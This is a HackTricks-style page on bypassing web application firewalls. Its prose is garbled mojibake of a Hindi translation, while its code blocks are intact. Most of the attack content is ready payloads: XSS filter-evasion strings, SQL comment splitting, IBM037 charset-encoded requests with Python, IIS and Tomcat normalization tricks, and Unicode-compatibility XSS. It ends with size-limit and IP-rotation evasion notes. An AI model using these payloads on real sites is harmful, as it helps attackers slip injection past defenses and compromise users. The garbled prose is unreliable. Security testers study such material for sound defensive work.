# WAF рдмрд╛рдпрдкрд╛рд╕

<details>

<summary><strong>рдЬрд╛рдиреЗрдВ AWS рд╣реИрдХрд┐рдВрдЧ рдХреЛ рд╢реВрдиреНрдп рд╕реЗ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдЕрдЧрд░ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕ рджреЗрдЦреЗрдВ**](https://github.com/sponsors/carlospolop)!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд▓реЗрдХреНрд╢рди, [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдЦреЛрдЬреЗрдВ
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдФрд░ рд╣рдореЗрдВ **рдЯреНрд╡рд┐рдЯрд░** ЁЯРж [**@carlospolopm**](https://twitter.com/hacktricks_live)** рдкрд░ рдлреЙрд▓реЛ** рдХрд░реЗрдВред
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>

## рд░реАрдЬреЗрдХреНрд╕ рдмрд╛рдпрдкрд╛рд╕

рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдкрд░ рд▓рдЧреЗ рд░реАрдЬреЗрдХреНрд╕ рдлрд╝рд┐рд▓реНрдЯрд░ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╡рд┐рднрд┐рдиреНрди рддрдХрдиреАрдХреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдЕрд▓реНрдЯрд░рдиреЗрдЯрд┐рдВрдЧ рдХреЗрд╕, рд▓рд╛рдЗрди рдмреНрд░реЗрдХреНрд╕ рдЬреЛрдбрд╝рдирд╛, рдФрд░ рдкреЗрд▓реЛрдб рдХреЛ рдЗрдиреНрдХреЛрдб рдХрд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред рд╡рд┐рднрд┐рдиреНрди рдмрд╛рдпрдкрд╛рд╕ рдХреЗ рд╕рдВрд╕рд╛рдзрди [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/README.md#filter-bypass-and-exotic-payloads) рдФрд░ [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/XSS\_Filter\_Evasion\_Cheat\_Sheet.html) рдкрд░ рдЙрдкрд▓рдмреНрдз рд╣реИрдВред рдиреАрдЪреЗ рджрд┐рдП рдЧрдП рдЙрджрд╛рд╣рд░рдг [рдЗрд╕ рд▓реЗрдЦ](https://medium.com/@allypetitt/5-ways-i-bypassed-your-web-application-firewall-waf-43852a43a1c2) рд╕реЗ рд▓рд┐рдП рдЧрдП рд╣реИрдВред
```bash
<sCrIpT>alert(XSS)</sCriPt> #changing the case of the tag
<<script>alert(XSS)</script> #prepending an additional "<"
<script>alert(XSS) // #removing the closing tag
<script>alert`XSS`</script> #using backticks instead of parenetheses
java%0ascript:alert(1) #using encoded newline characters
<iframe src=http://malicous.com < #double open angle brackets
<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> #uncommon tags
<img/src=1/onerror=alert(0)> #bypass space filter by using / where a space is expected
<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> #extra characters
Function("ale"+"rt(1)")(); #using uncommon functions besides alert, console.log, and prompt
javascript:74163166147401571561541571411447514115414516216450615176 #octal encoding
<iframe src="javascript:alert(`xss`)"> #unicode encoding
/?id=1+un/**/ion+sel/**/ect+1,2,3-- #using comments in SQL query to break up statement
new Function`alt\`6\``; #using backticks instead of parentheses
data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ #base64 encoding the javascript
%26%2397;lert(1) #using HTML encoding
<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> #Using Line Feed (LF) line breaks
<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> # use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
```
## рдЪрд╛рд░рд╕реЗрдЯ рдЗрдиреНрдХреЛрдбрд┐рдВрдЧ
```bash
# Charset encoding
application/x-www-form-urlencoded;charset=ibm037
multipart/form-data; charset=ibm037,boundary=blah
multipart/form-data; boundary=blah; charset=ibm037

##Python code
import urllib
s = 'payload'
print(urllib.parse.quote_plus(s.encode("IBM037")))

## Request example
GET / HTTP/1.1
Host: buggy
Content-Type: application/x-www-form-urlencoded; charset=ibm500
Content-Length: 61

%86%89%93%85%95%81%94%85=KKaKKa%C6%D3%C1%C7K%A3%A7%A3&x=L%A7n
```
## рдЕрд╡рд┐рд╡рд╛рджреАрдХрд░рдг
```bash
# IIS, ASP Clasic
<%s%cr%u0131pt> == <script>

# Path blacklist bypass - Tomcat
/path1/path2/ == ;/path1;foo/path2;bar/;
```
## рдпреВрдирд┐рдХреЛрдб рд╕рдВрдЧрддрддрд╛

рдпреВрдирд┐рдХреЛрдб рд╕рдорд╛рдирд╛рдВрддрд░рддрд╛ рдХреЗ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ (рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА [рдпрд╣рд╛рдБ](https://jlajara.gitlab.io/Bypass\_WAF\_Unicode)), рдЬрд┐рди рд╡рд░реНрдгреЛрдВ рдХрд╛ рдпреВрдирд┐рдХреЛрдб рд╕рдВрдЧрддрддрд╛ рд╕рд╛рдЭрд╛ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ, рд╡реЗ WAF рдХреЛ рдЫрд▓рдХрд░ рдЧреБрдЬрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрдЪреНрдЫрд┐рдд рдкреЗрд▓реЛрдб рдХреЗ рд░реВрдк рдореЗрдВ рдХрд╛рд░реНрдпрд╛рдиреНрд╡рд┐рдд рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред рд╕рдВрдЧрдд рд╡рд░реНрдг рдпрд╣рд╛рдБ рдкрд╛рдП рдЬрд╛ рд╕рдХрддреЗ рд╣реИрдВ [рдпрд╣рд╛рдБ](https://www.compart.com/en/unicode)

### рдЙрджрд╛рд╣рд░рдг
```bash
# under the NFKD normalization algorithm, the characters on the left translate
# to the XSS payload on the right
я╝Ьimg srcтБ╝p onerrorтБ╝я╝ЗpromptтБ╜1тБ╛я╝Зя╣е  --> я╝Ьimg src=p onerror='prompt(1)'>
```
## рдЖрдХрд╛рд░ рд╕реАрдорд╛ рдХреЛ рдкрд╛рд░ рдХрд░рдирд╛

рдХреНрд▓рд╛рдЙрдб рдЖрдзрд╛рд░рд┐рдд WAFs рдореЗрдВ рдпрд╣ рд╕рд╛рдорд╛рдиреНрдп рд╣реИ рдХрд┐ рдпрджрд┐ payload X рд╕рд╛рдЗрдЬрд╝ рд╕реЗ рдЕрдзрд┐рдХ рд╣реИ, рддреЛ рдЕрдиреБрд░реЛрдз рдХреЛ WAF рджреНрд╡рд╛рд░рд╛ рдЬрд╛рдВрдЪрд╛ рдирд╣реАрдВ рдЬрд╛рдПрдЧрд╛ред рдЖрдк рдЙрдиреНрд╣реЗрдВ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

### IP рд░реЛрдЯреЗрд╢рди

* [https://github.com/rootcathacking/catspin](https://github.com/rootcathacking/catspin)
